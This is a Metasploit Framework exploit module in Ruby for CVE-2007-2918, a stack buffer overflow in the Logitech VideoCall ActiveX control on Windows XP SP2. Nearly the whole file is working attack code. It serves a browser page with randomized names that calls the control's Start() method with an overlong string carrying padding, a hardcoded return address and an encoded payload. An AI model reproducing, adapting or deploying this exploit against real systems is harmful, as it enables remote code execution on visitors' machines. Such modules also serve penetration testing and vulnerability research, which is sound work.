##
# $Id: logitechvideocall_start.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Logitech VideoCall ActiveX Control Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in the Logitech VideoCall ActiveX
				Control (wcamxmp.dll 2.0.3470.448). By sending a overly long string to the
				"Start()" method, an attacker may be able to execute arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'MC' ],
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'CVE', '2007-2918' ],
					[ 'OSVDB', '36820'],
					[ 'BID', '24254' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 800,
					'BadChars'      => "\x00\x09\x0a\x0d'\\",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP Pro SP2 English',     { 'Offset' => 120, 'Ret' => 0x7c941eed } ],
				],
			'DisclosureDate' => 'May 31 2007',
			'DefaultTarget'  => 0))
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)
		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# Randomize some things
		vname	= rand_text_alpha(rand(100) + 1)
		strname	= rand_text_alpha(rand(100) + 1)

		# Set the exploit buffer
		sploit = rand_text_alpha(target['Offset']) + [target.ret].pack('V') + p.encoded

		# Build out the message
		content = %Q|
			<html>
			<object classid='clsid:BF4C7B03-F381-4544-9A33-CB6DAD2A87CD' id='#{vname}'></object>
			<script language='javascript'>
			var #{vname} = document.getElementById('#{vname}');
			var #{strname} = new String('#{sploit}');
			#{vname}.Start(#{vname}, #{vname}, #{strname});
			</script>
			</html>
			|

		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end

end
